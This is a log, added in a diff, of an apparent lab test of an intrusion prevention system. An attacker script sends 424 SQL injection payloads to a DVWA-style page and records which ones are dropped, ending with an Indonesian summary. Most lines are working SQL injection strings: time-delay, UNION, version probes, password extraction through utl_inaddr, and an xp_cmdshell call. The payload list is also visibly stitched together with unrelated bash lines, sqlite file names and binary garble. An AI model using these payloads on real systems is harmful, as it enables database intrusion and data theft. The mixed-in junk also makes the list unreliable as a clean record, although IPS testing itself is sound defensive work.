+[172/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [DROP] BLOCKED/DROPPED (timeout)
+[173/424] end="%20%6f%72%20%2f%61%5b%63%6f%6e%74%61%69%6e%73%28%61%2c% [DROP] BLOCKED/DROPPED (timeout)
+[174/424] ")))) and 0=benchmark(3000000,MD5(1))%20%23                  [DROP] BLOCKED/DROPPED (timeout)
+[175/424] N) # Filter Evasion Intermediary chars ' ' => '%2f%2a%0B%0C% [WARN] HTTP 302
+[176/424] '))) and 0=benchmark(3000000,MD5(1))%20%23                   [DROP] BLOCKED/DROPPED (timeout)
+[177/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[178/424] %27%20or%201=1                                               [WARN] HTTP 302
+[179/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[180/424] ' and 0=benchmark(3000000,MD5(1))%20%23                      [DROP] BLOCKED/DROPPED (timeout)
+[181/424] vbuff="%2f%2a%5b$xcount%5d"                                  [WARN] HTTP 302
+[182/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [DROP] BLOCKED/DROPPED (timeout)
+[183/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [DROP] BLOCKED/DROPPED (timeout)
+[184/424] " and 0=benchmark(3000000,MD5(1))%20%23                      [DROP] BLOCKED/DROPPED (timeout)
+[185/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [DROP] BLOCKED/DROPPED (timeout)
+[186/424] badparams=`echo "$cleanoutput" | replace "$payload" "%27%20% [DROP] BLOCKED/DROPPED (timeout)
+[187/424] echo "  -z Multi-byte quote                   '''        '%b [WARN] HTTP 302
+[188/424] badparams=`echo "$cleanoutput" | replace "$payload" "%27%20% [DROP] BLOCKED/DROPPED (timeout)
+[189/424] ") and 0=benchmark(3000000,MD5(1))%20%23                     [DROP] BLOCKED/DROPPED (timeout)
+[190/424] encodeoutput=`echo $encodeoutput | replace "%20" "%234i5ugh4 [WARN] HTTP 302
+[191/424] badparams=`echo "$cleanoutput" | replace "$payload" "%27%20% [DROP] BLOCKED/DROPPED (timeout)
+[192/424] echo "  -N Intermediary chars space           ' '        '%2 [WARN] HTTP 302
+[193/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[194/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[195/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[196/424] end="%20%6f%72%20%2f%61%5b%27%61"                            [DROP] BLOCKED/DROPPED (timeout)
+[197/424] ))) and 0=benchmark(3000000,MD5(1))%20%23                    [DROP] BLOCKED/DROPPED (timeout)
+[198/424] ) and 0=benchmark(3000000,MD5(1))%20%23                      [DROP] BLOCKED/DROPPED (timeout)
+[199/424] ')) and 0=benchmark(3000000,MD5(1))%20%23                    [DROP] BLOCKED/DROPPED (timeout)
+[200/424] and 0=benchmark(3000000,MD5(1))%20%23                        [DROP] BLOCKED/DROPPED (timeout)
+[201/424] )))) and 0=benchmark(3000000,MD5(1))%20%23                   [DROP] BLOCKED/DROPPED (timeout)
+[202/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [WARN] HTTP 302
+[203/424] badparams=`echo "$cleanoutput" | replace "$payload" "%27%20% [DROP] BLOCKED/DROPPED (timeout)
+[204/424] begin="%33%34%35%27%29%5d"                                   [WARN] HTTP 302
+[205/424] ')))) and 0=benchmark(3000000,MD5(1))%20%23                  [DROP] BLOCKED/DROPPED (timeout)
+[206/424] echo "  -w Comment+newline space              ' '        '%2 [WARN] HTTP 302
+[207/424] "))) and 0=benchmark(3000000,MD5(1))%20%23                   [DROP] BLOCKED/DROPPED (timeout)
+[208/424] end="%20%6f%72%20%27%65%27%3d%27%72"                         [DROP] BLOCKED/DROPPED (timeout)
+[209/424] ")) and 0=benchmark(3000000,MD5(1))%20%23                    [DROP] BLOCKED/DROPPED (timeout)
+[210/424] badparams=`echo "$cleanoutput" | replace "$payload" "%27%20% [DROP] BLOCKED/DROPPED (timeout)
+[211/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[212/424] ') and 0=benchmark(3000000,MD5(1))%20%23                     [DROP] BLOCKED/DROPPED (timeout)
+[213/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [DROP] BLOCKED/DROPPED (timeout)
+[214/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[215/424] /uploads/plus/rss.php?tid=1&_Cs[][1]&_Cs[2%29%29%20AND%20%22 [DROP] BLOCKED/DROPPED (timeout)
+[216/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [WARN] HTTP 302
+[217/424] )) and 0=benchmark(3000000,MD5(1))%20%23                     [DROP] BLOCKED/DROPPED (timeout)
+[218/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[219/424] 0x00;select case when 20=20 then 'a'||dbms_pipe.receive_mess [DROP] BLOCKED/DROPPED (timeout)
+[220/424] RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE  [DROP] BLOCKED/DROPPED (timeout)
+[221/424] 0x0a\' or 20<94 --                                           [DROP] BLOCKED/DROPPED (timeout)
+[222/424] 0x0a or 'xyz'='xyz'                                          [DROP] BLOCKED/DROPPED (timeout)
+[223/424] 0x0a and 1337=dbms_pipe.receive_message((\\'a\\'),120)       [WARN] HTTP 302
+[224/424] 0x0a';select banner from v$version --                        [WARN] HTTP 302
+[225/424] 0x00\';select @@version --                                   [WARN] HTTP 302
+[226/424] 0x0a;select @@version                                        [WARN] HTTP 302
+[227/424] 0x730065006c00650063007400200040004000760065007200730069006f [WARN] HTTP 302
+[228/424] 0x0d0a or 1337=dbms_pipe.receive_message(1,120)              [WARN] HTTP 302
+[229/424] 0x0a\\';select version from v$instance --                    [WARN] HTTP 302
+[230/424] 0x00 or 1337=dbms_pipe.receive_message(1,120)                [WARN] HTTP 302
+[231/424] 0x00' or 1337=dbms_pipe.receive_message(1,120) --            [DROP] BLOCKED/DROPPED (timeout)
+[232/424] 0x0a and 1337=dbms_pipe.receive_message(1,120) --            [DROP] BLOCKED/DROPPED (timeout)
+[233/424] 0x0a and 1337=dbms_pipe.receive_message(('a'),120)           [WARN] HTTP 302
+[234/424] 0x00';select version from v$instance --                      [WARN] HTTP 302
+[235/424] declare @q nvarchar (200) 0x730065006c0065006300740020004000 [WARN] HTTP 302
+[236/424] 0x0a\\';select case when 20=20 then \\'a\\'||dbms_pipe.recei [DROP] BLOCKED/DROPPED (timeout)
+[237/424] 0x00\' or \'xyz\'=\'xyz                                      [DROP] BLOCKED/DROPPED (timeout)
+[238/424] 0x770061006900740066006F0072002000640065006C0061007900200027 [WARN] HTTP 302
+[239/424] 0x0a\\' or \\'xyz\\'=\\'xyz\\' --                            [DROP] BLOCKED/DROPPED (timeout)
+[240/424] 0x00';select case when 20=20 then 'a'||dbms_pipe.receive_mes [DROP] BLOCKED/DROPPED (timeout)
+[241/424] 0x00' or 1337=dbms_pipe.receive_message(('a'),120) --        [DROP] BLOCKED/DROPPED (timeout)
+[242/424] 0x00 or \\'xyz\\'=\\'xyz\\'                                  [DROP] BLOCKED/DROPPED (timeout)
+[243/424] declare @q nvarchar (200) 0x730065006c00650063 ...           [WARN] HTTP 302
+[244/424] 0x0a' and 1337=dbms_pipe.receive_message(1,120) --           [DROP] BLOCKED/DROPPED (timeout)
+[245/424] 0x0a;select @@version --                                     [WARN] HTTP 302
+[246/424] 0x0d0a' or 1337=dbms_pipe.receive_message(('a'),120) --      [DROP] BLOCKED/DROPPED (timeout)
+[247/424] 0x77616974666F722064656C61792027303A303A313027 ...           [WARN] HTTP 302
+[248/424] 0x0d0a\' or 1337=dbms_pipe.receive_message((\'a\'),120) --   [DROP] BLOCKED/DROPPED (timeout)
+[249/424] %00 or 1337=dbms_pipe.receive_message((\'a\'),120) --        [DROP] BLOCKED/DROPPED (timeout)
+[250/424] %00' or 'xyz'='xyz' --                                       [DROP] BLOCKED/DROPPED (timeout)
+[251/424] %00;select version() --                                      [WARN] HTTP 302
+[252/424] %00;select @@version --                                      [WARN] HTTP 302
+[253/424] %00\';select version from v$instance --                      [WARN] HTTP 302
+[254/424] %00;select banner from v$version                             [WARN] HTTP 302
+[255/424] echo "%00"$quack >> nullpayloads.txt                         [WARN] HTTP 302
+[256/424] %00 or 1337=dbms_pipe.receive_message(1,120) --              [DROP] BLOCKED/DROPPED (timeout)
+[257/424] %00' or 20<94 --                                             [DROP] BLOCKED/DROPPED (timeout)
+[258/424] %00 and 1337=dbms_pipe.receive_message((\'a\'),120) --       [WARN] HTTP 302
+[259/424] %00 or \\'xyz\\'=\\'xyz\\' --                                [DROP] BLOCKED/DROPPED (timeout)
+[260/424] %00' or 1337=dbms_pipe.receive_message(1,120) --             [DROP] BLOCKED/DROPPED (timeout)
+[261/424] %00 and 1337=dbms_pipe.receive_message((\\'a\\'),120) --     [WARN] HTTP 302
+[262/424] %00;select case when 20=20 then \'a\'||dbms_pipe.receive_mes [DROP] BLOCKED/DROPPED (timeout)
+[263/424] %00;select banner from v$version --                          [WARN] HTTP 302
+[264/424] %00\';select case when 20=20 then \'a\'||dbms_pipe.receive_m [DROP] BLOCKED/DROPPED (timeout)
+[265/424] %00\\' or \\'xyz\\'=\\'xyz                                   [DROP] BLOCKED/DROPPED (timeout)
+[266/424] %00 or \'xyz\'=\'xyz\' --                                    [DROP] BLOCKED/DROPPED (timeout)
+[267/424] %00;select case when 20=20 then 'a'||dbms_pipe.receive_messa [DROP] BLOCKED/DROPPED (timeout)
+[268/424] %00\\';select version() --                                   [WARN] HTTP 302
+[269/424] ORDER BY 16                                                  [WARN] HTTP 302
+[270/424] ORDER BY 26--                                                [WARN] HTTP 302
+[271/424] \\';select @@version --                                      [WARN] HTTP 302
+[272/424] %0a;select version() --                                      [WARN] HTTP 302
+[273/424] and (select substring(@@version,1,1))='M'                    [DROP] BLOCKED/DROPPED (timeout)
+[274/424] or 1 in (select @@version)--                                 [DROP] BLOCKED/DROPPED (timeout)
+[275/424] ORDER BY 22                                                  [WARN] HTTP 302
+[276/424] %0d%0a';select @@version --                                  [WARN] HTTP 302
+[277/424] ORDER BY 10#                                                 [WARN] HTTP 302
+[278/424] and (select substring(@@version,2,1))='i'                    [DROP] BLOCKED/DROPPED (timeout)
+[279/424] ORDER BY 24--                                                [WARN] HTTP 302
+[280/424] a' order by 9999#                                            [DROP] BLOCKED/DROPPED (timeout)
+[281/424] ORDER BY 3--                                                 [WARN] HTTP 302
+[282/424] \n';select version() --                                      [WARN] HTTP 302
+[283/424] \r\n;select @@version                                        [WARN] HTTP 302
+[284/424] ORDER BY 2--                                                 [WARN] HTTP 302
+[285/424] ORDER BY 16                                                  [WARN] HTTP 302
+[286/424] ORDER BY 16#                                                 [DROP] BLOCKED/DROPPED (timeout)
+[287/424] ORDER BY 27                                                  [WARN] HTTP 302
+[288/424] ORDER BY 25                                                  [WARN] HTTP 302
+[289/424] %0d%0a\';select version() --                                 [WARN] HTTP 302
+[290/424] ORDER BY 4#                                                  [DROP] BLOCKED/DROPPED (timeout)
+[291/424] ORDER BY 2#                                                  [WARN] HTTP 302
+[292/424] ORDER BY 1--                                                 [WARN] HTTP 302
+[293/424] ORDER BY 28--                                                [DROP] BLOCKED/DROPPED (timeout)
+[294/424] ORDER BY 24#                                                 [WARN] HTTP 302
+[295/424] \\r\\n';select @@version --                                  [WARN] HTTP 302
+[296/424] ORDER BY 16--                                                [WARN] HTTP 302
+[297/424] 1' ORDER BY 2--+                                             [DROP] BLOCKED/DROPPED (timeout)
+[298/424] ORDER BY 2                                                   [WARN] HTTP 302
+[299/424] 1,test-2.sqlite                                              [WARN] HTTP 302
+[300/424] badparams=`echo "$cleanoutput" | replace "$payload" "$numera [DROP] BLOCKED/DROPPED (timeout)
+[301/424] x' AND 1=(SELECT COUNT(*) FROM tabname); --                  [DROP] BLOCKED/DROPPED (timeout)
+[302/424] 4,run-423.sqlite                                             [WARN] HTTP 302
+[303/424] \r\n;select version from v$instance --                       [WARN] HTTP 302
+[304/424] 4,run-134.sqlite                                             [WARN] HTTP 302
+[305/424] echo "  -e SQL delay injection"                              [WARN] HTTP 302
+[306/424] while [[ $ahcount -le $maxxcount ]] ; do                     [WARN] HTTP 302
+[307/424] 7,db-setup.sqlite                                            [WARN] HTTP 302
+[308/424] '                                                            [WARN] HTTP 302
+[309/424] 1,testcod-1000055.sqlite3                                    [DROP] BLOCKED/DROPPED (timeout)
+[310/424] 4,run-907.sqlite                                             [WARN] HTTP 302
+[311/424] 4,run-259.sqlite                                             [WARN] HTTP 302
+[312/424] t'exec master..xp_cmdshell 'nslookup www.google.com'--       [WARN] HTTP 302
+[313/424] %0d%0a union all select cast(dbms_pipe.receive_message(('a') [DROP] BLOCKED/DROPPED (timeout)
+[314/424] 1,padu-destination.sqlite                                    [DROP] BLOCKED/DROPPED (timeout)
+[315/424] 4,run-377.sqlite                                             [WARN] HTTP 302
+[316/424] ' or ''&'                                                    [DROP] BLOCKED/DROPPED (timeout)
+[317/424] 4,run-530.sqlite                                             [WARN] HTTP 302
+[318/424] inputbuffer=`echo $inputbuffer | replace " " "/*d*/"`        [WARN] HTTP 302
+[319/424] 8,run-97.sqlite                                              [WARN] HTTP 302
+[320/424] elif [[ "$xp" == "dualconditionalnumeric" ]] ; then          [WARN] HTTP 302
+[321/424] 4,run-480.sqlite                                             [WARN] HTTP 302
+[322/424] 1' GROUP BY 1,2,--+                                          [WARN] HTTP 302
+[323/424] self.log.error('Could not create SQLite database. Please try [WARN] HTTP 302
+[324/424] 4,run-403.sqlite                                             [WARN] HTTP 302
+[325/424] if [[ "$status_true" != "$status_false" && "$status_true" == [WARN] HTTP 302
+[326/424] length_false=`echo $response | cut -d ":" -f 2`              [WARN] HTTP 302
+[327/424] a'||/**/456=678#                                             [WARN] HTTP 302
+[328/424] ' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWOR [DROP] BLOCKED/DROPPED (timeout)
+[329/424] 4,run-326.sqlite                                             [WARN] HTTP 302
+[330/424] 4,run-338.sqlite                                             [WARN] HTTP 302
+[331/424] static=`echo $i | cut -d " " -f 2 | cut -d "?" -f 2`         [WARN] HTTP 302
+[332/424] headertoset="$headertoadd"                                   [WARN] HTTP 302
+[333/424] inurl:&#8221;games.php?id=                                   [WARN] HTTP 302
+[334/424] 4,run-138.sqlite                                             [WARN] HTTP 302
+[335/424] ? ? ???-?-?-?!??                                    [WARN] HTTP 302
+[336/424] if [ $firstPOSTURIURL == 2 ] ; then #we want to fuzz the POS [WARN] HTTP 302
+[337/424] J) # Filter Evasion nesting 'select' => 'selselectect'       [WARN] HTTP 302
+[338/424] 10,run-18.sqlite                                             [WARN] HTTP 302
+[339/424] 4,run-430.sqlite                                             [WARN] HTTP 302
+[340/424] 4,run-921.sqlite                                             [WARN] HTTP 302
+[341/424] 1,oqmd-1514.sqlite3                                          [DROP] BLOCKED/DROPPED (timeout)
+[342/424] 1,test-rel.sqlite3                                           [WARN] HTTP 302
+[343/424] tput sgr0 # Reset attributes.                                [WARN] HTTP 302
+[344/424] badparams=`echo "$cleanoutput" | replace "$payload" "1/(case [DROP] BLOCKED/DROPPED (timeout)
+[345/424] %0d%0a\\' and 1337=dbms_pipe.receive_message(1,120) --       [DROP] BLOCKED/DROPPED (timeout)
+[346/424] echo "XPath element hierachy found at ./output/$safelogname. [WARN] HTTP 302
+[347/424] echo "POST" $outer"???"$mparams                              [WARN] HTTP 302
+[348/424] nullwrongstring=$nullwrongstring"null"                       [WARN] HTTP 302
+[349/424] while [[ $attgcount -le $maxxcount ]] ; do                   [WARN] HTTP 302
+[350/424] if [[ $timediff -gt 3 || $timediff -lt -3 ]] ; then          [WARN] HTTP 302
+[351/424] 4,run-850.sqlite                                             [WARN] HTTP 302
+[352/424] ' or uname like '%                                           [DROP] BLOCKED/DROPPED (timeout)
+[353/424] 4,run-967.sqlite                                             [WARN] HTTP 302
+[354/424] 4,run-307.sqlite                                             [WARN] HTTP 302
+[355/424] create user name identified by 'pass123'                     [WARN] HTTP 302
+[356/424] " or "" "                                                    [DROP] BLOCKED/DROPPED (timeout)
+[357/424] 4,run-779.sqlite                                             [WARN] HTTP 302
+[358/424] or '7659'='7659                                              [DROP] BLOCKED/DROPPED (timeout)
+[359/424] 4,run-102.sqlite                                             [WARN] HTTP 302
+[360/424] )) and 0=benchmark(3000000,MD5(1))%20--                      [DROP] BLOCKED/DROPPED (timeout)
+[361/424] stringofparams=`echo $params | tr "&" " "`                   [WARN] HTTP 302
+[362/424] if [[ "$status1" != "200" && "$status1" == "$status999" && " [WARN] HTTP 302
+[363/424] iu=".child node: ---"                                        [WARN] HTTP 302
+[364/424] if [ true = "$Z" ] ; then echo "DEBUG! encoder input: $input [WARN] HTTP 302
+[365/424] ((lendiff=$lengthselY-$lengthselN))                          [WARN] HTTP 302
+[366/424] 4,run-590.sqlite                                             [WARN] HTTP 302
+[367/424] 8,run-59.sqlite                                              [WARN] HTTP 302
+[368/424] echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC $dbms [WARN] HTTP 302
+[369/424] \\' or \\'xyz\\'=\\'xyz\\' --                                [DROP] BLOCKED/DROPPED (timeout)
+[370/424] 4,run-726.sqlite                                             [WARN] HTTP 302
+[371/424] echo "Some examples are: -s, -n, -q, -r, -e, -b, -C" >&2     [WARN] HTTP 302
+[372/424] 1,safari-partial.sqlite                                      [WARN] HTTP 302
+[373/424] 8,run-22.sqlite                                              [WARN] HTTP 302
+[374/424] admin" or "1"="1                                             [DROP] BLOCKED/DROPPED (timeout)
+[375/424] \\n\\' or 1337=dbms_pipe.receive_message(1,120) --           [DROP] BLOCKED/DROPPED (timeout)
+[376/424] ' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(U [DROP] BLOCKED/DROPPED (timeout)
+[377/424] elif [[ $dbms == "oracle" ]] ; then                          [WARN] HTTP 302
+[378/424] echo -n "$char" >> ./listofxpathelements.txt                 [WARN] HTTP 302
+[379/424] 8,run-86.sqlite                                              [WARN] HTTP 302
+[380/424] ???'??ƥ???m?/ܩ??%d?"Ռ(d?2?E?A??(????'???+? ύ??B???? [WARN] HTTP 302
+[381/424] 1,storage-sync.sqlite                                        [DROP] BLOCKED/DROPPED (timeout)
+[382/424] " or "a"="a                                                  [DROP] BLOCKED/DROPPED (timeout)
+[383/424] " or ""&"                                                    [DROP] BLOCKED/DROPPED (timeout)
+[384/424] %0d%0a and 1337=dbms_pipe.receive_message(('a'),120)         [WARN] HTTP 302
+[385/424] ')) and 0=benchmark(3000000,MD5(1)) #                        [DROP] BLOCKED/DROPPED (timeout)
+[386/424] \\r\\n;select case when 20=20 then 'a'||dbms_pipe.receive_me [DROP] BLOCKED/DROPPED (timeout)
+[387/424] )%20or%20('x'='x                                             [DROP] BLOCKED/DROPPED (timeout)
+[388/424] )) and 0=benchmark(3000000,MD5(1)) #                         [DROP] BLOCKED/DROPPED (timeout)
+[389/424] if [[ true = "$n" || true = "$s" || true = "$e" || true = "$ [WARN] HTTP 302
+[390/424] ; exec ('sel' + 'ect us' + 'er')                             [WARN] HTTP 302
+[391/424] 4,run-111.sqlite                                             [WARN] HTTP 302
+[392/424] 4,run-608.sqlite                                             [WARN] HTTP 302
+[393/424] 4,run-459.sqlite                                             [WARN] HTTP 302
+[394/424] 1,bio-fake.sqlite3                                           [DROP] BLOCKED/DROPPED (timeout)
+[395/424] ';                                                           [WARN] HTTP 302
+[396/424] echo "Attempting to brute force $findme. If you get bored hi [WARN] HTTP 302
+[397/424] 1,-sqlite.sqlite3                                            [DROP] BLOCKED/DROPPED (timeout)
+[398/424] admin' or '1'='1'--                                          [DROP] BLOCKED/DROPPED (timeout)
+[399/424] echo "[ORDER BY: $colno COL REQ:$K] $request" >> ./output/$s [WARN] HTTP 302
+[400/424] 4,run-623.sqlite                                             [WARN] HTTP 302
+[401/424] if [[ $oflag == "1" ]] ; then #this routine gets run once at [DROP] BLOCKED/DROPPED (timeout)
+[402/424] 8,run-25.sqlite                                              [WARN] HTTP 302
+[403/424] 1,db-PORT-ZOMPARELLI.sqlite3                                 [DROP] BLOCKED/DROPPED (timeout)
+[404/424] ' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(c [DROP] BLOCKED/DROPPED (timeout)
+[405/424] /**/                                                         [WARN] HTTP 302
+[406/424] 6,token-version-1.5.sqlite                                   [WARN] HTTP 302
+[407/424] if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then            [WARN] HTTP 302
+[408/424] 4,run-425.sqlite                                             [WARN] HTTP 302
+[409/424] rbuff="/*[$xcount]"                                          [WARN] HTTP 302
+[410/424] 4,run-555.sqlite                                             [WARN] HTTP 302
+[411/424] ') or ('x')=('x                                              [DROP] BLOCKED/DROPPED (timeout)
+[412/424] p) # hash + noise + newline                                  [WARN] HTTP 302
+[413/424] ' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_ [DROP] BLOCKED/DROPPED (timeout)
+[414/424] quote="'"                                                    [WARN] HTTP 302
+[415/424] 1,pi-ager.sqlite3                                            [WARN] HTTP 302
+[416/424] ')) or benchmark(10000000,MD5(1))#                           [DROP] BLOCKED/DROPPED (timeout)
+[417/424] \n' or 1337=dbms_pipe.receive_message(1,120) --              [DROP] BLOCKED/DROPPED (timeout)
+[418/424] or 1/*                                                       [WARN] HTTP 302
+[419/424] '),(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchma [DROP] BLOCKED/DROPPED (timeout)
+[420/424] stringlength=${#uriinputdecode}                              [WARN] HTTP 302
+[421/424] xp="conditionalstring"                                       [WARN] HTTP 302
+[422/424] 1,tub-bourg.sqlite3                                          [DROP] BLOCKED/DROPPED (timeout)
+
+--------------------------------------------------------
+  RINGKASAN SERANGAN:
+  Total Payload Dikirim : 422
+  Diblokir (DROP/timeout): 194
+  Lolos ke server       : 228
+--------------------------------------------------------
+
+[LOG] Logging dimulai: 2026-07-04 09:21:01
+[LOG] File log: /home/ubuntu/Documents/HNIPS_project/runner_scripts/saved_logs/attacker/log-nomor 1_send_attack.txt
+
+========================================================
+  NODE ATTACKER: SEND ATTACK (SQLi Payloads)
+========================================================
+  Target  : http://172.17.0.2/vulnerabilities/sqli/
+  File    : /home/ubuntu/Documents/HNIPS_project/sqli_payloads.txt
+  Payloads: 424
+  Cookie  : PHPSESSID=pgdrle5m5kd2rdvs9rbp8u6il6; se...
+========================================================
+
+  Format output:
+  -> Menampilkan payload yang dikirim
+  -> HTTP Status Code respons dari server
+  (Status 000/timeout = paket di-DROP oleh IPS)
+
+========================================================
+[  1/424] \\n union all select 1337,1337,1337,1337,1337,1337,1337,1337 [DROP] BLOCKED/DROPPED (timeout)
+[  2/424] 0x00' union all select cast(pg_sleep(120) as integer),null,n [DROP] BLOCKED/DROPPED (timeout)
+[  3/424] %0d%0a\\' union all select cast(pg_sleep(120) as integer),nu [DROP] BLOCKED/DROPPED (timeout)
+[  4/424] %0d%0a union all select '1337','1337','1337','1337' waitfor  [DROP] BLOCKED/DROPPED (timeout)
+[  5/424] %00\' union all select cast(pg_sleep(120) as integer),null,n [DROP] BLOCKED/DROPPED (timeout)
+[  6/424] 0x0a\\' union all select sleep(120),1337,1337,1337 --        [DROP] BLOCKED/DROPPED (timeout)
+[  7/424] \\n' union all select cast(pg_sleep(120) as integer),'1337', [DROP] BLOCKED/DROPPED (timeout)
+[  8/424] 0x00\' union all select sleep(120),null,null --              [DROP] BLOCKED/DROPPED (timeout)
+[  9/424] \r\n\' union all select 1337,1337,1337,1337 waitfor delay \' [DROP] BLOCKED/DROPPED (timeout)
+[ 10/424] %0a\' union all select cast(pg_sleep(120) as text),'1337','1 [DROP] BLOCKED/DROPPED (timeout)
+[ 11/424] %00 union all select cast(pg_sleep(120) as text),null,null,n [DROP] BLOCKED/DROPPED (timeout)
+[ 12/424] 0x0a\\' union all select (select 1337 from pg_sleep(120)),nu [DROP] BLOCKED/DROPPED (timeout)
+[ 13/424] 0x0a' union all select sleep(120),1337,1337,1337,1337,1337,1 [DROP] BLOCKED/DROPPED (timeout)
+[ 14/424] %0a union all select sleep(120),null,null,null,null,null,nul [DROP] BLOCKED/DROPPED (timeout)
+[ 15/424] \r\n\' union all select sleep(120),1337,1337,1337,1337,1337, [DROP] BLOCKED/DROPPED (timeout)
+[ 16/424] \\r\\n\\' union all select cast(pg_sleep(120) as text),1337, [DROP] BLOCKED/DROPPED (timeout)
+[ 17/424] %0d%0a union all select cast(pg_sleep(120) as integer),'1337 [DROP] BLOCKED/DROPPED (timeout)
+[ 18/424] \\' union all select cast(pg_sleep(120) as integer),1337,133 [DROP] BLOCKED/DROPPED (timeout)
+[ 19/424] UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000 [DROP] BLOCKED/DROPPED (timeout)
+[ 20/424] \r\n union all select sleep(120),null,null,null,null --      [DROP] BLOCKED/DROPPED (timeout)
+[ 21/424] %0a and 1337=(select 1337 from (select sleep(120))A) --      [DROP] BLOCKED/DROPPED (timeout)
+[ 22/424] %0a waitfor delay '00:02'                                    [DROP] BLOCKED/DROPPED (timeout)
+[ 23/424] 0x00\' union all select (select 1337 from pg_sleep(120)),nul [DROP] BLOCKED/DROPPED (timeout)
+[ 24/424] \\n\\' union all select cast(pg_sleep(120) as integer),1337, [DROP] BLOCKED/DROPPED (timeout)
+[ 25/424] %0a union all select sleep(120) --                           [DROP] BLOCKED/DROPPED (timeout)
+[ 26/424] %00 union all select sleep(120)                              [DROP] BLOCKED/DROPPED (timeout)
+[ 27/424] %0d%0a union all select (select 1337 from pg_sleep(120)),nul [DROP] BLOCKED/DROPPED (timeout)
+[ 28/424] ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9, [DROP] BLOCKED/DROPPED (timeout)
+[ 29/424] \\r\\n\\' and 1337=(select 1337 from pg_sleep(120)) --       [DROP] BLOCKED/DROPPED (timeout)
+[ 30/424] ' union all select cast(pg_sleep(120) as text),1337 --       [DROP] BLOCKED/DROPPED (timeout)
+[ 31/424] 0x00\' union all select cast(pg_sleep(120) as text),1337,133 [DROP] BLOCKED/DROPPED (timeout)
+[ 32/424] )) waitfor delay '0:0:__TIME__' /*                           [DROP] BLOCKED/DROPPED (timeout)
+[ 33/424] \\n' union all select cast(pg_sleep(120) as text),null,null, [DROP] BLOCKED/DROPPED (timeout)
+[ 34/424] 0x0d0a union all select null,null,null,null,null,null,null,n [DROP] BLOCKED/DROPPED (timeout)
+[ 35/424] \\r\\n union all select 1337,1337,1337,1337,1337,1337 waitfo [DROP] BLOCKED/DROPPED (timeout)
+[ 36/424] 0x00\\' union all select cast(pg_sleep(120) as text),'1337', [DROP] BLOCKED/DROPPED (timeout)
+[ 37/424] 0x00\\' union all select cast(pg_sleep(120) as integer),null [DROP] BLOCKED/DROPPED (timeout)
+[ 38/424] 0x00;select pg_sleep(120)                                    [DROP] BLOCKED/DROPPED (timeout)
+[ 39/424] %0a union all select cast(pg_sleep(120) as integer),1337,133 [DROP] BLOCKED/DROPPED (timeout)
+[ 40/424] \n' union all select cast(pg_sleep(120) as integer),1337,133 [DROP] BLOCKED/DROPPED (timeout)
+[ 41/424] %00 union all select cast(dbms_pipe.receive_message((\'a\'), [DROP] BLOCKED/DROPPED (timeout)
+[ 42/424] \r\n union all select '1337','1337','1337' from dual         [DROP] BLOCKED/DROPPED (timeout)
+[ 43/424] %0a' union all select cast(dbms_pipe.receive_message(1,120)  [DROP] BLOCKED/DROPPED (timeout)
+[ 44/424] 0x0a' union all select cast(dbms_pipe.receive_message(('a'), [DROP] BLOCKED/DROPPED (timeout)
+[ 45/424] \\n union all select cast(dbms_pipe.receive_message((\'a\'), [DROP] BLOCKED/DROPPED (timeout)
+[ 46/424] %0d%0a' union all select cast(dbms_pipe.receive_message(('a' [DROP] BLOCKED/DROPPED (timeout)
+[ 47/424] %0a union all select dbms_pipe.receive_message(1,120),1337,1 [DROP] BLOCKED/DROPPED (timeout)
+[ 48/424] %0a union all select null,null from dual --                  [DROP] BLOCKED/DROPPED (timeout)
+[ 49/424] %00\' union all select '1337','1337','1337','1337','1337','1 [DROP] BLOCKED/DROPPED (timeout)
+[ 50/424] 0x0a' union all select cast(dbms_pipe.receive_message(1,120) [DROP] BLOCKED/DROPPED (timeout)
+[ 51/424] 0x0d0a union all select 1337,1337,1337,1337,1337,1337,1337,1 [DROP] BLOCKED/DROPPED (timeout)
+[ 52/424] \n union all select cast(dbms_pipe.receive_message(('a'),120 [DROP] BLOCKED/DROPPED (timeout)
+[ 53/424] 0x0a' union all select dbms_pipe.receive_message(('a'),120), [DROP] BLOCKED/DROPPED (timeout)
+[ 54/424] \n union all select dbms_pipe.receive_message((\'a\'),120),n [DROP] BLOCKED/DROPPED (timeout)
+[ 55/424] %0d%0a union all select dbms_pipe.receive_message((\'a\'),12 [DROP] BLOCKED/DROPPED (timeout)
+[ 56/424] \n union all select cast(dbms_pipe.receive_message(1,120) as [DROP] BLOCKED/DROPPED (timeout)
+[ 57/424] \n union all select cast(dbms_pipe.receive_message((\'a\'),1 [DROP] BLOCKED/DROPPED (timeout)
+[ 58/424] \\n' union all select dbms_pipe.receive_message(1,120),null, [DROP] BLOCKED/DROPPED (timeout)
